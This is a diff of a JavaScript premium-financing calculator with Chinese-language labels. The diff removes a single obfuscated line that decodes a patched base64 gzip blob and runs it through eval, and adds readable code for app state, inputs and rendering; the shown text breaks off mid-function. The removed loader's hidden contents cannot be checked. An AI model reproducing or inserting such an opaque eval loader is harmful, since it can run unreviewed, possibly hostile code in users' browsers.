@@ -1,1 +1,1089 @@
-'use strict';(async()=>{let payload='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';payload=payload.replace('YWdSUU1feD6i','YWdSU5feD6i');const binary=atob(payload);const bytes=new Uint8Array(binary.length);for(let index=0;index<binary.length;index+=1){bytes[index]=binary.charCodeAt(index)}const stream=new Blob([bytes]).stream().pipeThrough(new DecompressionStream('gzip'));const source=await new Response(stream).text();(0,eval)(source+'\n//# sourceURL=app.results-monthly-r5.source.js')})().catch((error)=>{console.error('Unable to load calculator script.',error);const status=document.getElementById('saveStatus');if(status){status.textContent='程式載入失敗'}});
+"use strict";
+
+const STORAGE_KEY = "premium-financing-calculator-v2";
+const SCENARIOS = [
+  { key: "low", label: "低息率", className: "low", color: "#2e5f8a" },
+  { key: "base", label: "基本息率", className: "base", color: "#1e6f57" },
+  { key: "high", label: "高息率", className: "high", color: "#b86f21" }
+];
+
+let state;
+let els = {};
+
+function initApp() {
+  state = loadState();
+  cacheElements();
+  bindEvents();
+  renderAll();
+}
+
+if (document.readyState === "loading") {
+  document.addEventListener("DOMContentLoaded", initApp);
+} else {
+  initApp();
+}
+
+function cacheElements() {
+  els = {
+    sampleBtn: document.getElementById("sampleBtn"),
+    clearBtn: document.getElementById("clearBtn"),
+    csvBtn: document.getElementById("csvBtn"),
+    printBtn: document.getElementById("printBtn"),
+    currencyLabel: document.getElementById("currencyLabel"),
+    currencyToggle: document.getElementById("currencyToggle"),
+    displayCurrency: document.getElementById("displayCurrency"),
+    chartCurrencyPill: document.getElementById("chartCurrencyPill"),
+    exchangeRateInput: document.getElementById("exchangeRateInput"),
+    policyPriceInput: document.getElementById("policyPriceInput"),
+    yearsInput: document.getElementById("yearsInput"),
+    firstDaySurrenderInput: document.getElementById("firstDaySurrenderInput"),
+    discountInput: document.getElementById("discountInput"),
+    loanRatioInput: document.getElementById("loanRatioInput"),
+    loanAmountInput: document.getElementById("loanAmountInput"),
+    investedCapitalInput: document.getElementById("investedCapitalInput"),
+    yearlyModeBtn: document.getElementById("yearlyModeBtn"),
+    fixedModeBtn: document.getElementById("fixedModeBtn"),
+    fixedLowInput: document.getElementById("fixedLowInput"),
+    fixedBaseInput: document.getElementById("fixedBaseInput"),
+    fixedHighInput: document.getElementById("fixedHighInput"),
+    applyFixedBtn: document.getElementById("applyFixedBtn"),
+    rateModeLabel: document.getElementById("rateModeLabel"),
+    saveStatus: document.getElementById("saveStatus"),
+    assumptionHint: document.getElementById("assumptionHint"),
+    summaryGrid: document.getElementById("summaryGrid"),
+    assumptionBody: document.getElementById("assumptionBody"),
+    resultsTables: document.getElementById("resultsTables"),
+    rangeInputs: {
+      low: {
+        start: document.getElementById("rangeLowStart"),
+        end: document.getElementById("rangeLowEnd")
+      },
+      base: {
+        start: document.getElementById("rangeBaseStart"),
+        end: document.getElementById("rangeBaseEnd")
+      },
+      high: {
+        start: document.getElementById("rangeHighStart"),
+        end: document.getElementById("rangeHighEnd")
+      }
+    },
+    chartCanvases: {
+      low: document.getElementById("chartLow"),
+      base: document.getElementById("chartBase"),
+      high: document.getElementById("chartHigh")
+    }
+  };
+}
+
+function bindEvents() {
+  els.sampleBtn.addEventListener("click", () => {
+    state = createSampleState();
+    renderAll();
+  });
+
+  els.clearBtn.addEventListener("click", () => {
+    state = createBlankState();
+    renderAll();
+  });
+
+  els.csvBtn.addEventListener("click", exportCsv);
+  els.printBtn.addEventListener("click", () => window.print());
+
+  els.currencyToggle.addEventListener("click", () => {
+    state.currency = state.currency === "USD" ? "HKD" : "USD";
+    renderAll();
+  });
+
+  els.exchangeRateInput.addEventListener("input", () => {
+    const nextRate = readNumber(els.exchangeRateInput.value, state.exchangeRate);
+    state.exchangeRate = nextRate > 0 ? nextRate : state.exchangeRate;
+    renderAll({ keepExchangeInput: true });
+  });
+
+  els.policyPriceInput.addEventListener("input", () => {
+    state.policyPriceUsd = Math.max(0, displayToUsd(readNumber(els.policyPriceInput.value, 0)));
+    recalculateLinkedAmounts("policy");
+    renderAll({ keepPolicyInput: true });
+  });
+
+  els.yearsInput.addEventListener("input", () => {
+    const nextYears = clamp(Math.round(readNumber(els.yearsInput.value, state.years)), 1, 40);
+    if (nextYears !== state.years) {
+      state.years = nextYears;
+      resizeProjectionArrays();
+      normalizeChartRanges();
+      renderAll();
+    }
+  });
+
+  els.firstDaySurrenderInput.addEventListener("input", () => {
+    state.firstDaySurrenderUsd = Math.max(0, displayToUsd(readNumber(els.firstDaySurrenderInput.value, 0)));
+    recalculateLinkedAmounts("firstDaySurrender");
+    renderAll({ keepFirstDayInput: true });
+  });
+
+  els.discountInput.addEventListener("input", () => {
+    state.discountPercent = clamp(readNumber(els.discountInput.value, 0), 0, 100);
+    recalculateLinkedAmounts("discount");
+    renderAll({ keepDiscountInput: true });
+  });
+
+  els.loanRatioInput.addEventListener("input", () => {
+    state.loanRatio = Math.max(0, readNumber(els.loanRatioInput.value, 0));
+    recalculateLinkedAmounts("loanRatio");
+    renderAll({ keepLoanRatioInput: true });
+  });
+
+  els.loanAmountInput.addEventListener("input", () => {
+    state.loanAmountUsd = Math.max(0, displayToUsd(readNumber(els.loanAmountInput.value, 0)));
+    recalculateLinkedAmounts("loanAmount");
+    renderAll({ keepLoanAmountInput: true });
+  });
+
+  els.investedCapitalInput.addEventListener("input", () => {
+    state.investedCapitalUsd = displayToUsd(readNumber(els.investedCapitalInput.value, 0));
+    recalculateLinkedAmounts("investedCapital");
+    renderAll({ keepInvestedCapitalInput: true });
+  });
+
+  document.querySelectorAll("[data-rate-mode]").forEach((button) => {
+    button.addEventListener("click", () => {
+      state.rateMode = button.dataset.rateMode;
+      renderAll();
+    });
+  });
+
+  const syncFixedRatesFromInputs = () => {
+    state.fixedRates.low = clamp(readRateValue(els.fixedLowInput.value, state.fixedRates.low), 0, 100);
+    state.fixedRates.base = clamp(readRateValue(els.fixedBaseInput.value, state.fixedRates.base), 0, 100);
+    state.fixedRates.high = clamp(readRateValue(els.fixedHighInput.value, state.fixedRates.high), 0, 100);
+  };
+
+  [els.fixedLowInput, els.fixedBaseInput, els.fixedHighInput].forEach((input) => {
+    input.addEventListener("focus", () => {
+      input.select();
+    });
+    input.addEventListener("input", () => {
+      syncFixedRatesFromInputs();
+      renderOutputsAndSave();
+    });
+    input.addEventListener("blur", () => {
+      syncFixedRatesFromInputs();
+      renderAll();
+    });
+  });
+
+  els.applyFixedBtn.addEventListener("click", () => {
+    state.rateMode = "fixed";
+    renderAll();
+  });
+
+  els.assumptionBody.addEventListener("input", (event) => {
+    const input = event.target;
+    const index = Number(input.dataset.index);
+    if (!Number.isInteger(index)) {
+      return;
+    }
+
+    if (input.dataset.kind === "policy") {
+      state.policyValuesUsd[index] = Math.max(0, displayToUsd(readNumber(input.value, 0)));
+    }
+
+    if (input.dataset.kind === "rate" && state.rateMode === "yearly") {
+      const scenario = input.dataset.scenario;
+      state.scenarioRates[scenario][index] = clamp(readRateValue(input.value, state.scenarioRates[scenario][index]), 0, 100);
+    }
+
+    renderOutputsAndSave();
+  });
+
+  els.assumptionBody.addEventListener("focusin", (event) => {
+    const input = event.target;
+    if (input.dataset.kind === "rate") {
+      input.select();
+    }
+  });
+
+  els.assumptionBody.addEventListener("focusout", (event) => {
+    const input = event.target;
+    const index = Number(input.dataset.index);
+    if (input.dataset.kind !== "rate" || !Number.isInteger(index)) {
+      return;
+    }
+
+    const scenario = input.dataset.scenario;
+    if (state.scenarioRates[scenario]) {
+      input.value = formatInputNumber(state.scenarioRates[scenario][index], 2);
+    }
+  });
+
+  SCENARIOS.forEach((scenario) => {
+    const range = els.rangeInputs[scenario.key];
+    [range.start, range.end].forEach((input) => {
+      input.addEventListener("input", () => {
+        state.chartRanges[scenario.key].start = Math.round(readNumber(range.start.value, 1));
+        state.chartRanges[scenario.key].end = Math.round(readNumber(range.end.value, state.years));
+        normalizeChartRanges();
+        renderOutputsAndSave();
+      });
+    });
+  });
+
+  window.addEventListener("resize", () => drawCharts(calculateProjection()));
+}
+
+function renderAll(options = {}) {
+  normalizeState();
+  renderInputs(options);
+  renderRateMode();
+  renderChartRangeInputs();
+  renderAssumptionTable();
+  renderOutputsAndSave();
+}
+
+function renderInputs(options = {}) {
+  els.currencyLabel.textContent = state.currency;
+  els.displayCurrency.textContent = state.currency;
+  els.chartCurrencyPill.textContent = state.currency;
+  els.currencyToggle.textContent = state.currency === "USD" ? "切換港幣" : "切回美金";
+
+  document.querySelectorAll(".currency-code").forEach((node) => {
+    node.textContent = state.currency;
+  });
+
+  if (!options.keepExchangeInput) {
+    els.exchangeRateInput.value = formatInputNumber(state.exchangeRate, 4);
+  }
+  if (!options.keepPolicyInput) {
+    els.policyPriceInput.value = formatInputNumber(usdToDisplay(state.policyPriceUsd), 0);
+  }
+  if (!options.keepFirstDayInput) {
+    els.firstDaySurrenderInput.value = formatInputNumber(usdToDisplay(state.firstDaySurrenderUsd), 0);
+  }
+  if (!options.keepDiscountInput) {
+    els.discountInput.value = formatInputNumber(state.discountPercent, 2);
+  }
+  if (!options.keepLoanRatioInput) {
